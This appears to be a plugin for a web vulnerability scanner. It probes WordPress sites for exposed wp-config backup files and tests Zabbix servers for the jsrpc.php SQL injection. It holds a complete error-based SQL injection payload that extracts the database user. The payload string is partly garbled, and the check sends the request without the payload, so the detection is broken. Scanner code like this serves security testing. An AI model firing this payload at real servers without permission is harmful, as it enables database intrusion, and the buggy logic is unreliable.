# Wordpress
# /wp-config.php.inc    {status=200}       {tag="<?php"}
# /wp-login.php         {tag="user_login"}  {status=200}
# /wp-config.inc        {status=200}       {tag="<?php"}
# /wp-config.bak        {status=200}       {tag="<?php"}
# /wp-config.php~       {status=200}       {tag="<?php"}
# /.wp-config.php.swp   {status=200}       {tag="<?php"}
# /wp-config.php.bak    {status=200}       {tag="<?php"}

from lib.common import save_user_script_result

payload = '?sid=0bcd4ade648214dc&type=9&method=screen.get&tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim%20estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi%20story.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20user())x%20from%20information_schema.character_sets%20group%20by%20x)y)&updateProfil%20e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=%2017&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&%20mark_color=1'
mark = "Duplicate entry"

def do_check(self, url):
    if url == '/' and self.conn_pool and self.lang == 'php':
        url_lst = ['/zabbix/jsrpc.php',
        '/jsrpc.php']
        for _url in url_lst:
            status, headers, html_doc = self._http_request(_url)
            if status == 200 or status == 206:
                u = _url + payload
                status, headers, html_doc = self._http_request(_url)
                if mark in html_doc:
                    save_user_script_result(self, status, self.base_url + u, 'Zabbix jsrpc SQLi Found')
                break
